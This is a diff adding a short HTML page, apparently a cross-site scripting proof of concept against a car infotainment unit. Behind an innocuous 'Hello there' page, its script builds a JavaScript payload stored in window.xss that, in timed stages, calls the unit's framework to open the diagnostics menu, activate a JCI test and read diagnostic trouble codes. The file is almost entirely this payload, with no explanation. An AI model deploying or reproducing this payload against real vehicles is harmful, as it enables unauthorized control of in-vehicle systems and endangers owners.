@@ -1,0 +1,31 @@
+<html>
+<head>
+    <script>
+        var payload =  'setTimeout(function() {'
+            payload += '    if (window.x_stage == 1) {'
+            payload += '        framework.sendEventToMmui("diag", "ActivateJCITest");'
+            payload += '        window.x_stage = 2;'
+            payload += '    }'
+            payload += '}, 5000);'
+            payload += 'setTimeout(function() {'
+            payload += '    if (window.x_stage == 2) {'
+            payload += '        framework.sendEventToMmui("diag", "ReadDTC", {'
+            payload += '           "payload": {'
+            payload += '                "testId": 11'
+            payload += '            }'
+            payload += '        });'
+            payload += '        window.x_stage = 3;'
+            payload += '    }'
+            payload += '}, 10000);'
+            payload += 'window.x_stage = 1;'
+            payload += 'framework.sendEventToMmui("syssettings", "SelectDiagnostics");';
+
+        window.xss = payload;        
+    </script>
+</head>
+<body>
+    <div>
+        <h1>Hello there</h1>
+    </div>
+</body>
+</html>
